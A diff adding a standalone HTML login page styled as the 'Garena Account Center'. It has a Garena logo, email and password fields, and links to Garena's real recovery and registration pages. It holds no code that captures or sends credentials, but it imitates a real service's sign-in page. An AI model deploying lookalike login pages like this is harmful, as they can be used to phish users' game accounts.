@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Account Center</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: url('https://example.com/battle-royale-background.jpg') no-repeat center center fixed;
+            background-size: cover;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 1400px;
+            padding: 230px;
+            background: rgba(255, 255, 255, 0.9); /* Slightly transparent white */
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        .logo img {
+            max-width: 140px;
+            height: auto;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 15px;
+            color: #333;
+        }
+        .form-group input[type="text"], .form-group input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+            color: #333;
+        }
+        .form-group input[type="text"]:focus, .form-group input[type="password"]:focus {
+            border-color: #e74c3c;
+            outline: none;
+        }
+        .form-group button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(145deg, #e74c3c, #c0392b);
+            border: none;
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 17px;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
+            margin-top: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        .form-group button:hover {
+            background: linear-gradient(145deg, #d62c1a, #a03a2a);
+            transform: translateY(-3px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+        }
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 15px;
+            color: #333;
+        }
+        .forgot-password a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        .register {
+            margin-top: 20px;
+        }
+        .register button {
+            background: #ffffff;
+            border: 1px solid #d0d0d0;
+            color: #333;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 6px;
+            width: 100%;
+            transition: background 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .register button:hover {
+            background: #f0f0f0;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        .terms {
+            margin-top: 30px;
+            font-size: 13px;
+            color: #777;
+        }
+        .terms a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        .terms a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://static.wikia.nocookie.net/leagueoflegends/images/0/0a/Garena_logo_1.png/revision/latest?cb=20200119130415" alt="Garena Logo">
+        </div>
+        <form>
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="text" id="email" name="email" placeholder="Garena Username, Email or Phone">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password">
+            </div>
+            <div class="forgot-password">
+                <a href="https://account.garena.com/recovery#/" target="_blank">Forgot Password?</a>
+            </div>
+            <div class="form-group">
+                <button type="submit">Login</button>
+            </div>
+        </form>
+        <div class="register">
+            <button type="button" onclick="window.location.href='https://sso.garena.com/universal/register?redirect_uri=https://sso.garena.com/universal/login?app_id=10100%26redirect_uri=https://account.garena.com/%26locale=en-US&locale=en-US';">Register a New Account</button>
+        </div>
+        <div class="terms">
+            <p>
+                <a href="https://careers.garena.com/global/terms" target="_blank">Terms of Service</a> and <a href="https://careers.garena.com/global/privacy" target="_blank">Privacy Policy</a>
+            </p>
+        </div>
+    </div>
+</body>
+</html>
